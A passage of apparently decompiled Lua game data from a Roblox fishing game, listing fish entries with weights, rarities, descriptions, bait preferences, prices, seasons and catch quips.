			SparkleColor = Color3.fromRGB(255, 186, 125);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Moosewood"
		};["Grey Carp"] = {
			WeightPool = {
				20,
				70
			};
			Chance = 55;
			Rarity = "Uncommon";
			Resilience = 60;
			Description = "The Grey Carp is a sturdy freshwater fish known for its strength and adaptability. They can be found in Mushgrove Swamp feeding on plants and small insects. The Grey Carp is extrremely strong, and is a tough battle to catch.";
			Hint = "Found in Mushgrove Swamp near the fallen watch tower.";
			FavouriteBait = "Seaweed";
			FavouriteTime = nil;
			Price = 120;
			XP = 75;
			Seasons = {
				"None"
			};
			Weather = {
				"Autumn"
			};
			Quips = {
				"Is it grey magic?",
				"Woah, a Grey Carp!",
				"It's a Carp!",
				"Woahh! A Grey Carp!!",
				"Carp-tastic!",
				"!!!",
				"Woah! Grey Carp!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Mushgrove"
		};["Red Snapper"] = {
			WeightPool = {
				10,
				70
			};
			Chance = 75;
			Rarity = "Common";
			Resilience = 75;
			Description = "The Red Snapper is a common salt water fish that can be commonly found all around Moosewoods oceans. They are a very noticable fish with their obvious red and light red tones.";
			Hint = "Found in saltwater near Moosewood Docks. Prefers the the Summer and Autumn.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 70;
			XP = 80;
			Seasons = {
				"Summer",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Red Snapper!",
				"Woah! I caught a Red Snapper!",
				"I caught a Red Snapper!",
				"Red Snapper!!!"
			};
			SparkleColor = Color3.fromRGB(255, 74, 74);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Moosewood"
		};Mackerel = {
			WeightPool = {
				10,
				40
			};
			Chance = 100;
			Rarity = "Common";
			Resilience = 85;
			Description = "The Mackerel is a fast-swimming, silver fish with distinctive stripes and high-oil content. Mackerel are most active from spring to autumn in mildly warm weather.";
			Hint = "Found in mildly warm saltwater.";
			FavouriteBait = "Shrimp";
			FavouriteTime = "Day";
			Price = 75;
			XP = 80;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Mackerel!",
				"I caught a Mackerel!",
				"Woah, a Mackerel!",
				"Mackerelllll!",
				"What's up, Mackerel!"
			};
			SparkleColor = Color3.fromRGB(207, 207, 207);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Haddock = {
			WeightPool = {
				15,
				40
			};
			Chance = 110;
			Rarity = "Common";
			Resilience = 85;
			Description = "Haddock are small, silvery fish found in cold ocean waters. Haddock are often found in large schools, they are relatively easy to catch and are easy to find near their signature 'Haddock Rock'.";
			Hint = "Found in schools near 'Haddock rock'.";
			FavouriteBait = "Worm";
			FavouriteTime = "Day";
			Price = 50;
			XP = 60;
			Seasons = {
				"Autumn",
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I caught a Haddock!",
				"Woah, a Haddock!!"
			};
			SparkleColor = Color3.fromRGB(227, 227, 227);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Cod = {
			WeightPool = {
				20,
				100
			};
			Chance = 75;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "Cod are robust, deep-water fish. Best found in the open cold oceans during winter and spring. Cods are a reliable and rewarding catch with substantial size and strong fighting ability.";
			Hint = "Found in cold deep ocean water.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 90;
			XP = 70;
			Seasons = {
				"Winter",
				"Spring"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Cod!",
				"I caught a Cod!",
				"Woah, a Cod!",
				"Cod of duty!",
				"What's up, Coddy!"
			};
			SparkleColor = Color3.fromRGB(207, 158, 139);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};["Longtail Bass"] = {
			WeightPool = {
				20,
				40
			};
			Chance = 50;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "The Longtail Bass is a striking species known for its elongated tail fin and vibrant coloration. It can be found all over the ocean, and is also a common catch of Sunstone Island!";
			Hint = "Found in open ocean water and in Sunstone.";
			FavouriteBait = "Shrimp";
			FavouriteTime = nil;
			Price = 120;
			XP = 70;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Longtail Bass!",
				"I caught a Longtail Bass!"
			};
			SparkleColor = Color3.fromRGB(255, 89, 89);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Sunstone"
		};Salmon = {
			WeightPool = {
				40,
				100
			};
			Chance = 70;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "Salmon are visually known for their silver skin and streamlined bodies. They are extremely strong swimmers and leapers, making them a difficult catch. You can find these Ocean Salmon in any deep bodies of salt water, and some freshwaters.";
			Hint = "Found in oceans and some freshwaters.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 130;
			XP = 90;
			Seasons = {
				"Spring",
				"Winter"
			};
			Weather = {
				"Rain",
				"Clear"
			};
			Quips = {
				"Salmoff!",
				"Woah!",
				"Awesome!",
				"A Salmon!",
				"Woah, A Salmon!",
				"A Salmon!!!"
			};
			SparkleColor = Color3.fromRGB(65, 166, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Arapaima = {
			WeightPool = {
				1000,
				2000
			};
			Chance = 15;
			Rarity = "Rare";
			Resilience = 30;
			Description = "Arapaima are massive freshwater fish with large, broad bodies and a distinctive, armor-like scaled appearance. They have a unique respiratory system that allows them to breathe air, as well as gills.";
			Hint = "Found in Roslit Bays freshwater durong the day.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 250;
			XP = 150;
			Seasons = {
				"None"
			};
			Weather = {
				"Rain",
				"Fog"
			};
			Quips = {
				"An Arapaima!",
				"I caught an Arapaima!",
				"Woah, an Arapaima!"
			};
			SparkleColor = Color3.fromRGB(154, 39, 39);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Roslit"
		};["Twilight Eel"] = {
			WeightPool = {
				100,
				200
			};
			Chance = 70;
			Rarity = "Uncommon";
			Resilience = 40;
			Description = "The Twilight Eel, whilst resembaling a giant tadpole, is an Eel. Twilight Eels are extremely slimy, and use the bulb on their head to attract prey.";
			Hint = "Found in Vertigo's Dip.";
			FavouriteBait = "Insect";
			FavouriteTime = nil;
			Price = 90;
			XP = 100;
			Seasons = {
				"Winter"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah, a Twilight Eel!",
				"I caught an Eel!",
				"It looks like a tadpole!"
			};
			SparkleColor = Color3.fromRGB(128, 255, 121);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Vertigo"
		};["Bluefin Tuna"] = {
			WeightPool = {
				1000,
				2200
			};
			Chance = 35;
			Rarity = "Rare";
			Resilience = 30;
			Description = "The Bluefin Tuna is a very large and strong species of Tuna. They are highly migratory and can travel extremely long distances. Their population is critically low due to overfishing; Making them rarer than other Tuna.";
			Hint = "Found in deep open.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 350;
			XP = 120;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Bluefin Tuna!",
				"I caught a Bluefin Tuna!",
				"Woah, a Bluefin Tuna!",
				"Tunaaaaa!",
				"What's up, Tuna!"
			};
			SparkleColor = Color3.fromRGB(125, 210, 255);
			HoldAnimation = L_58_:WaitForChild("heavy");
			From = "Ocean"
		};["Yellowfin Tuna"] = {
			WeightPool = {
				450,
				1360
			};
			Chance = 65;
			Rarity = "Uncommon";
			Resilience = 60;
			Description = "The Yellowfin Tuna is a species of tuna known for their speed and agility. The Yellowfin Tuna cna be found best near Moosewoods waters, but you can fidn them in most open saltwater due to them being highly migratory. They are less endangered than Bluefin Tuna but still face threats.";
			Hint = "Found in open saltwater near moosewood.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 120;
			XP = 80;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Yellowfin Tuna!",
				"I caught a Yellowfin Tuna!",
				"Woah, a Yellowfin Tuna!",
				"Tunaaaaa!",
				"What's up, Tuna!"
			};
			SparkleColor = Color3.fromRGB(255, 235, 135);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Moosewood"
		};Amberjack = {
			WeightPool = {
				200,
				400
			};
			Chance = 75;
			Rarity = "Uncommon";
			Resilience = 40;
			Description = "The Amberjack is a strong, fast-swimming fish known for their vigorous fights and robust body. Mostly active in spring, and best caught in open ocean waters with live baitfish such as small minnows. The Ambjerkack is not rare or hard to come by, but it does put up an impressive battle when trying to catch.";
			Hint = "Found in open saltwater.";
			FavouriteBait = "Minnow";
			FavouriteTime = "Day";
			Price = 115;
			XP = 80;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear",
				"Rain"
			};
			Quips = {
				"An Amberjack!",
				"I caught an Amberjack!",
				"Woah, an Amberjack!",
				"Lumberjack- I mean Amberjack!"
			};
			SparkleColor = Color3.fromRGB(219, 219, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Lapisjack = {
			WeightPool = {
				200,
				400
			};
			Chance = 55;
			Rarity = "Rare";
			Resilience = 20;
			Description = "The Lapisjack is a strong, fast-swimming fish known for their vigorous fights and robust body. Mostly active in spring, and only found in Keepers Altar. They are capable of sustaining their conscious when the Altar is active.";
			Hint = "Found in Keepers Altar.";
			FavouriteBait = "Minnow";
			FavouriteTime = "Day";
			Price = 115;
			XP = 80;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear",
				"Rain"
			};
			Quips = {
				"An Amberjack!",
				"I caught an Amberjack!",
				"Woah, an Amberjack!",
				"Lumberjack- I mean Amberjack!"
			};
			SparkleColor = Color3.fromRGB(219, 219, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Keepers Altar"
		};Lingcod = {
			WeightPool = {
				40,
				140
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 50;
			ProgressEfficiency = 0.95;
			Description = "A large, aggressive predator with mottled brown and green skin, known for its sharp teeth and oddly fierce fighting behavior when hooked. They can be found in ocean water near Snowcap during the day. They are especially active near the water-side enterance of Snowcap Cave.";
			Hint = "Found in Snowcaps ocean water during the day. Especially active near the water-side enterance of Snowcap Cave.";
			FavouriteBait = "Fish Head";
			FavouriteTime = "Day";
			Price = 110;
			XP = 80;
			Seasons = {
				"Autumn",
				"Summer"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"I caught a Lingcod!",
				"Woah! this is freaky!",
				"A Lingcod!",
				"It's a Lingcod!"
			};
			SparkleColor = Color3.fromRGB(76, 115, 55);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Snowcap"
		};Gudgeon = {
			WeightPool = {
				1,
				3
			};
			Chance = 80;
			Rarity = "Common";
			Resilience = 100;
			Description = "The Gudgeon is an extrmely small, slender fish. They are adaptable and can thrive in a variety of freshwater environments but are native and commonly found near Terrapin Island.";
			Hint = "Found in the water of Terrapin Island.";
			FavouriteBait = "Insect";
			FavouriteTime = "Day";
			Price = 40;
			XP = 10;
			Seasons = {
				"Spring, Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I can barely see it!",
				"A Gudgeon.!",
				"Oh, cool!"
			};
			SparkleColor = Color3.fromRGB(216, 251, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Terrapin"
		};Perch = {
			WeightPool = {
				2,
				12
			};
			Chance = 80;
			Rarity = "Common";
			Resilience = 70;
			Description = "The Perch is a common freshwater fish that is best found in Roslit Bays fresh water. They are known for their striped bodies and a playful behaviour.";
			Hint = "Found in freshwater of Roslit.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 70;
			XP = 80;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"A Perch!",
				"I caught a Perch!",
				"Woah, a Perch!",
				"Aww! A Perch!"
			};
			SparkleColor = Color3.fromRGB(119, 163, 77);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["White Perch"] = {
			WeightPool = {
				2,
				12
			};
			Chance = 80;
			Rarity = "Common";
			Resilience = 70;
			Description = "The Perch is a common freshwater fish that is best found in Mushgrove Swamp; Unlike the classic Perch, the White Perch has no noticable stripes.";
			Hint = "Found in Mushgrove.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 80;
			XP = 80;
			Seasons = {
				"Spring",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A White Perch!",
				"I caught a White Perch!",
				"Woah, a Perch!",
				"Aww! A Perch!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Mushgrove"
		};Goldfish = {
			WeightPool = {
				2,
				7
			};
			Chance = 55;
			Rarity = "Uncommon";
			Resilience = 90;
			Description = "Goldfish are found in Moosewoods pond and are best awake during the nice summer days. Even though they look weak, goldfish are highly tolerant of turbid waters, tempature fluctuations, and low levels of dissolved oxygen.";
			Hint = "Lives in calm ponds. Very easy to catch with bagels.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 65;
			XP = 75;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Doesn't look very gold..",
				"Woah, a Goldfish!",
				"A goldfish!",
				"I caught a Goldfish!",
				"Aw! I caught a Goldfish!"
			};
			SparkleColor = Color3.fromRGB(255, 184, 69);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};Bluefish = {
			WeightPool = {
				4,
				9
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 34;
			Description = "Bluefish are found inside Keepers Altar. They can inhabit some of the powerful keepers power that is present in Keepers Altars water. They are only awake during the day, as the power of the Altar is too much for tem to handle during the night.";
			Hint = "Swims quietly in Keepers Altar during the day.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 65;
			XP = 75;
			Seasons = {
				"Summer"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Woah, a Bluefish!",
				"A Bluefish!",
				"I caught a Bluefish!",
				"Aw! I caught a Bluefish!"
			};
			SparkleColor = Color3.fromRGB(60, 63, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Keepers Altar"
		};Minnow = {
			WeightPool = {
				1,
				6
			};
			Chance = 60;
			Rarity = "Common";
			Resilience = 90;
			Description = "Minnows are found in Roslit Bays pond and are easiest to find during the clear spring days. Minnows are commonly found in schools of 4 to 6 fish. They also create a great baitfish!";
			Hint = "Lives in Roslit Bays pond. Very easy to catch with bagels.";
			FavouriteBait = "Bagel";
			FavouriteTime = nil;
			Price = 45;
			XP = 75;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Ouu a Minnow!",
				"Woah, a Minnow!",
				"A Minnow!",
				"I caught a Minnow!",
				"Aw! I caught a Baitfish!"
			};
			SparkleColor = Color3.fromRGB(161, 161, 161);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};Halibut = {
			WeightPool = {
				1000,
				2000
			};
			Chance = 40;
			Rarity = "Rare";
			Resilience = 40;
			Description = "The Halibut is a large flatfish known for their impressive size and strength. They commonly feed on Haddock and can be found hunting near 'Haddock Rock' and in deep waters. ";
			Hint = "Found on the floor ocean. Best found near Haddock.";
			FavouriteBait = "Squid";
			FavouriteTime = nil;
			Price = 250;
			XP = 100;
			Seasons = {
				"Summer",
				"Spring"
			};
			Weather = {
				"Rain"
			};
			Quips = {
				"A Halibut!",
				"A Flatfish!",
				"I Caught a Halibut!",
				"Ou! A Halibut!"
			};
			SparkleColor = Color3.fromRGB(207, 129, 93);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Clownfish = {
			WeightPool = {
				1,
				6
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 70;
			Description = "The clownfish, known for its vibrant orange and white stripes, is a small, hardy reef dweller. Often found alongside coral and see anemones inside the reef of Roslit Bay.\t\t\tBest paired with the Blue Tang!";
			Hint = "Found in Roslit Bays coral reef.";
			FavouriteBait = "Flakes";
			FavouriteTime = nil;
			Price = 90;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"Ouu a Clownfish!",
				"Woah, a Clownfish!",
				"A Clownfish!",
				"I caught a Clownfish!",
				"I caught a Clownfish!",
				"What kind of circus is this?"
			};
			SparkleColor = Color3.fromRGB(255, 167, 43);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["Blue Tang"] = {
			WeightPool = {
				3,
				15
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 65;
			Description = "The Blue Tang is most renowned for its vivid blue coloration and yellow tail. Often found alongside coral and see anemones inside the reef of Roslit Bay.\t\t\tBest paired with the Clownfish!";
			Hint = "Found in Roslit Bays coral reef.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 90;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ouu a Blue Tang!",
				"Woah, a Blue Tang!",
				"A Blue Tang!",
				"I caught a Blue Tang!",
				"I caught a Blue Tang!",
				"Found her!"
			};
			SparkleColor = Color3.fromRGB(48, 69, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["Magma Tang"] = {
			WeightPool = {
				6,
				30
			};
			Chance = 50;
			Rarity = "Uncommon";
			Resilience = 40;
			Description = "The Magma Tang is a rare lava imbued Tang with a resting body temperature of 950C. They are extremely common in the lava, as they practically are part of the lava.";
			Hint = "Found in Roslit Volcano during the day.";
			FavouriteBait = "Coal";
			FavouriteTime = "Day";
			Price = 130;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ouu a Blue Tang!",
				"Woah, a Blue Tang!",
				"A Blue Tang!",
				"I caught a Blue Tang!",
				"I caught a Blue Tang!",
				"Found her!"
			};
			SparkleColor = Color3.fromRGB(255, 158, 73);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit Volcano"
		};["Red Tang"] = {
			WeightPool = {
				3,
				15
			};
			Chance = 55;
			Rarity = "Uncommon";
			Resilience = 65;
			Description = "The Red Tang is a relatively common catch within Sunstone Island. Very similar to other Tangs such as the Blue Tang, just red!";
			Hint = "Found in Sunstone Island.";
			FavouriteBait = "Flakes";
			FavouriteTime = nil;
			Price = 100;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ouu a Red Tang!",
				"Woah, a Red Tang!",
				"A Red Tang!",
				"I caught a Red Tang!",
				"I caught a Red Tang!",
				"Found her!.. But red!"
			};
			SparkleColor = Color3.fromRGB(255, 82, 82);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Sunstone"
		};["Pale Tang"] = {
			WeightPool = {
				3,
				15
			};
			Chance = 55;
			Rarity = "Uncommon";
			Resilience = 35;
			Description = "The Pale Tang is a relatively common catch within Keepers Altar. Very similar to other Tangs such as the Red Tang, just pale!- No one is sure of the Pale Tangs origin, and how it got accustomed to the Keepers Altar.";
			Hint = "Found in Keepers Altar.";
			FavouriteBait = "Bagel";
			FavouriteTime = nil;
			Price = 100;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Ouu a Pale Tang!",
				"Woah, a Pale Tang!",
				"A Pale Tang!",
				"I caught a Pale Tang!",
				"I caught a Pale Tang!",
				"Found her!.. But albino!"
			};
			SparkleColor = Color3.fromRGB(255, 187, 187);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Keepers Altar"
		};Glassfish = {
			WeightPool = {
				1,
				4
			};
			Chance = 90;
			Rarity = "Common";
			Resilience = 90;
			Description = "The glassfish is a small, transparent fish with a delicate, almost invisible body that makes it well-suited for avoiding predators. It is a common find within the waters of Sunstone Island.";
			Hint = "Found in Sunstone Island.";
			FavouriteBait = "Flakes";
			FavouriteTime = nil;
			Price = 45;
			XP = 50;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Ouu a Glassfish!",
				"Woah, a Glassfish!",
				"I can barely see it!"
			};
			SparkleColor = Color3.fromRGB(126, 126, 126);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Sunstone"
		};Angelfish = {
			WeightPool = {
				5,
				20
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 60;
			Description = "Angelfish are colorful and striking reef dwellers, known for their vibrant patterns and graceful swimming. Found in Roslit bays coral reef, they are a fun and elegant part of Roslits ecosystem.";
			Hint = "Found in Roslit Bays coral reef.";
			FavouriteBait = "Worm";
			FavouriteTime = nil;
			Price = 120;
			XP = 60;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"Ouu an Angelfish!",
				"Woah, an Angelfish!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};["Nurse Shark"] = {
			WeightPool = {
				1000,
				1500
			};
			Chance = 35;
			Rarity = "Unusual";
			Resilience = 35;
			Description = "Nurse Sharks are a nocturnal bottom feeder, spending most of their time on the ocean floor or in small crevices. Despite their appearance, they are gentle and slow-moving. Nurse Sharks can 'suction feed', using their powerful jaws to scrape algae off surfaces.";
			Hint = "Caught at night in the ocean.";
			FavouriteBait = "Minnow";
			FavouriteTime = "Night";
			Price = 200;
			XP = 100;
			Seasons = {
				"Summer",
				"Autumn"
			};
			Weather = {
				"None"
			};
			Quips = {
				"A Nurse Shark!",
				"Woah! A Nurse Shark!",
				"I Caught a Nurse Shark!"
			};
			SparkleColor = Color3.fromRGB(255, 152, 152);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Butterflyfish = {
			WeightPool = {
				2,
				15
			};
			Chance = 40;
			Rarity = "Uncommon";
			Resilience = 60;
			Description = "Butterflyfish are vibrant reef fish known for their striking colors and elaborate patterns. They feed and behave similar to other fish found in Roslit Bays coral reef.";
			Hint = "Found in Roslit Bays coral reef.";
			FavouriteBait = "Flakes";
			FavouriteTime = "Day";
			Price = 110;
			XP = 60;
			Seasons = {
				"None"
			};
			Weather = {
				"Clear",
				"Foggy"
			};
			Quips = {
				"Ouu a Glassfish!",
				"Woah, a Glassfish!",
				"I can barely see it!"
			};
			SparkleColor = Color3.fromRGB(255, 249, 80);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Roslit"
		};Flounder = {
			WeightPool = {
				15,
				55
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 80;
			Description = "Flounders are a demersal flatfish- meanig they feed at the bottom of the ocean, and has a flat body to blend in with the seafloor. Both of a flounders eyes are on one side, pointing upwars to the sky. They are easy to find in dark areas with a lot of surface or at night near Moosewood Docks.";
			Hint = "Lays flat at the bottom of the ocean. Prefers the night.";
			FavouriteBait = "Squid";
			FavouriteTime = "Night";
			Price = 120;
			XP = 80;
			Seasons = {
				"None"
			};
			Weather = {
				"Windy"
			};
			Quips = {
				"A Flounder!",
				"A Flatfish!",
				"I caught a Flounder!"
			};
			SparkleColor = Color3.fromRGB(86, 68, 57);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Moosewood"
		};Stingray = {
			WeightPool = {
				150,
				300
			};
			Chance = 20;
			Rarity = "Rare";
			Resilience = 50;
			Description = "Graceful and flat, stingrays glide effortlessly through the water, using their wide pectoral fins to move. Their long, whip-like tails end in a sharp stinger, which they can use for defense. Stingrays are bottom dwellers, often found in rocky and sandy seafloors and caves.";
			Hint = "Found in sea caves during the day.";
			FavouriteBait = "None";
			FavouriteTime = "Day";
			Price = 230;
			XP = 100;
			Seasons = {
				"Summer",
				"Spring"
			};
			Weather = {
				"Clear"
			};
			Quips = {
				"I caught a Stingray!",
				"Woah.. a Stingray!"
			};
			SparkleColor = Color3.fromRGB(180, 87, 50);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Ocean"
		};Barracuda = {
			WeightPool = {
				55,
				110
			};
			Chance = 60;
			Rarity = "Uncommon";
			Resilience = 55;
			Description = "Barracudas are large predatory fish, known for their fearsome appearance and ferocious behaviour. The barracuda is an adept saltwater hunter and are commonly mistaken as a hazard towarads humans, when in reality they are reletively comfortable and friendly swimmers. They can be found in deep oceans, and near Moosewood.";
			Hint = "Found in deeper saltwater and near Moosewood.";
			FavouriteBait = "Worm";
			FavouriteTime = "Day";
			Price = 150;
			XP = 90;
			Seasons = {
				"None"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah, a Barracuda!",
				"I caught a Barracuda!",
				"A Barracuda!!",
				"!!!!"
			};
			SparkleColor = Color3.fromRGB(117, 141, 121);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Ocean"
		};Abyssacuda = {
			WeightPool = {
				55,
				110
			};
			Chance = 20;
			Rarity = "Rare";
			Resilience = 10;
			Description = "Abyssacudas are large predatory fish, known for their fearsome appearance and ferocious behaviour. They are adept swimmers, and are a top predator for the Twilight Eel. Abyssacudas are related to the Barracuda, however their cause for being primarily innate to Vertigo is unknown.";
			Hint = "Found in Vertigos calm waters.";
			FavouriteBait = "Minnow";
			FavouriteTime = nil;
			Price = 400;
			XP = 90;
			Seasons = {
				"Spring",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah, a n Abyssacuda!",
				"I caught an Abyssacuda!",
				"An Abyssacuda!!",
				"Abyssacudaaaaa!!"
			};
			SparkleColor = Color3.fromRGB(87, 77, 116);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Vertigo"
		};["Alligator Gar"] = {
			WeightPool = {
				200,
				450
			};
			Chance = 45;
			Rarity = "Rare";
			Resilience = 40;
			Description = "The Alligator Gar is a large,vicious freshwater fish that can be found in Roslit Bays pond. Gars track back to 100 million years ago, giving them the nickname as a 'living fossil'.";
			Hint = "Can be found in lakes during summer.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 220;
			XP = 100;
			Seasons = {
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"I caught a Gar!",
				"It's an Alligator Gar!",
				"A Gar!!",
				"Woah, an Alligator Gar!",
				"Aye!! A Gar!"
			};
			SparkleColor = Color3.fromRGB(255, 255, 255);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Roslit"
		};["Marsh Gar"] = {
			WeightPool = {
				170,
				380
			};
			Chance = 30;
			Rarity = "Rare";
			Resilience = 30;
			Description = "The Marsh Gar is a large vicious marshwater fish that can be found in Mushgrove Swamp. March Gar are extremely strong hunters, using their whiskers to sense prey in foggy waters.";
			Hint = "Found under the bridges of Mushgrove Swamp.";
			FavouriteBait = "Fish Head";
			FavouriteTime = nil;
			Price = 280;
			XP = 100;
			Seasons = {
				"Winter"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Gar!",
				"I caught a Marsh Gar!",
				"Woah! A Marsh Gar!"
			};
			SparkleColor = Color3.fromRGB(180, 36, 36);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Mushgrove"
		};["Fangborn Gar"] = {
			WeightPool = {
				170,
				380
			};
			Chance = 50;
			Rarity = "Unusual";
			Resilience = 30;
			Description = "The Fangborn Gar is a vicious Voidwater fish that is completely blind. They roam the waters aimlessly and use a sense of smell to track food in Vertigo Dip.";
			Hint = "Found in Vertigo's cave water.";
			FavouriteBait = "Fish Head";
			FavouriteTime = nil;
			Price = 170;
			XP = 100;
			Seasons = {
				"None"
			};
			Weather = {
				"Foggy"
			};
			Quips = {
				"A Gar!",
				"I caught a Fangborn Gar!",
				"Woah! A Fangborn Gar!"
			};
			SparkleColor = Color3.fromRGB(32, 26, 48);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Vertigo"
		};Trumpetfish = {
			WeightPool = {
				9,
				20
			};
			Chance = 40;
			Rarity = "Unusual";
			Resilience = 60;
			Description = "The Trumpetfish is a long, slender fish known for its tubular body and pointed snout. Its unique shape makes it a fascinating sight for visitors of Sunstone.";
			Hint = "Found in the waters near Sunstone Island during the day.";
			FavouriteBait = "Shrimp";
			FavouriteTime = "Day";
			Price = 100;
			XP = 80;
			Seasons = {
				"Autumn",
				"Summer"
			};
			Weather = {
				"None"
			};
			Quips = {
				"Woah, a Trumpetfish!",
				"Baby Keem!",
				"What a catch!",
				"Holy.. This thing is weird.."
			};
			SparkleColor = Color3.fromRGB(247, 255, 98);
			HoldAnimation = L_58_:WaitForChild("tiny");
			From = "Sunstone"
		};["Mahi Mahi"] = {
			WeightPool = {
				70,
				150
			};
			Chance = 20;
			Rarity = "Rare";
			Resilience = 30;
			Description = "The Mahi Mahi is a vibrant, fast-swimming fish known for its striking colors of blue, green, and yellow. They can be found all around Sunstone island, and is prized by many anglers.";
			Hint = "Found near Sunstone Island.";
			FavouriteBait = "None";
			FavouriteTime = nil;
			Price = 150;
			XP = 90;
			Seasons = {
				"Spring"
			};
			Weather = {
				"Clear",
				"Windy"
			};
			Quips = {
				"I caught a Mahi Mahi!",
				"Woah, a Mahi Mahi!!",
				"It's a Mahi Mahi!"
			};
			SparkleColor = Color3.fromRGB(255, 249, 89);
			HoldAnimation = L_58_:WaitForChild("basic");
			From = "Sunstone"
		};["Voidfin Mahi"] = {
			WeightPool = {
				75,
				155
			};
			Chance = 10;
			Rarity = "Rare";
			Resilience = 10;
			Description = "The Voidfin Mahi are extremely fast and sensitive fish. They can sense a heartbeat from hundreds of miles, and are capable of swimming through some solid bio-matters, such as wood.";
